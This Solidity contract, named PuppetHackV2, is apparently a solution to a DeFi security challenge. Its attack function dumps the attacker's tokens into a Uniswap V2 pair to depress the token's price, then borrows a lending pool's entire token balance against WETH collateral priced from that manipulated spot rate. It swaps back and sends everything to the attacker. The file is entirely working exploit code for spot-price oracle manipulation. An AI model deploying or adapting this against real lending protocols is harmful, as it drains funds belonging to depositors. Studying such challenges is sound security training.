// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

interface IPool {
    function borrow(uint256 borrowAmount) external;

    function calculateDepositOfWETHRequired(uint256 tokenAmount)
        external
        view
        returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

contract PuppetHackV2 {
    IPool immutable pool;
    IERC20 immutable token;
    IUniswapV2Router02 immutable router;
    IWETH immutable WETH;
    address immutable attacker;

    constructor(
        address _pool,
        address _token,
        address _router,
        address _weth,
        address _attacker
    ) {
        pool = IPool(_pool);
        token = IERC20(_token);
        router = IUniswapV2Router02(_router);
        attacker = _attacker;
        WETH = IWETH(_weth);
    }

    function attack() external payable {
        require(
            token.transferFrom(
                attacker,
                address(this),
                token.balanceOf(attacker)
            ),
            "Failed to transferFrom attacker"
        );
        require(
            token.approve(address(router), type(uint256).max),
            "Failed to approve router"
        );

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(WETH);

        router.swapExactTokensForTokens(
            token.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 300 seconds
        );

        WETH.deposit{value: address(this).balance}();

        uint256 poolTokenBalance = token.balanceOf(address(pool));

        require(
            WETH.approve(address(pool), type(uint256).max),
            "Failed to approve WETH for the pool"
        );

        pool.borrow(poolTokenBalance);

        require(
            WETH.approve(address(router), type(uint256).max),
            "Router WETH approval failed"
        );

        address[] memory path2 = new address[](2);
        path2[0] = address(WETH);
        path2[1] = address(token);

        router.swapExactTokensForTokens(
            WETH.balanceOf(address(this)),
            0,
            path2,
            address(this),
            block.timestamp + 300 seconds
        );
        require(
            token.transfer(attacker, token.balanceOf(address(this))),
            "Transfer failed"
        );
    }
}
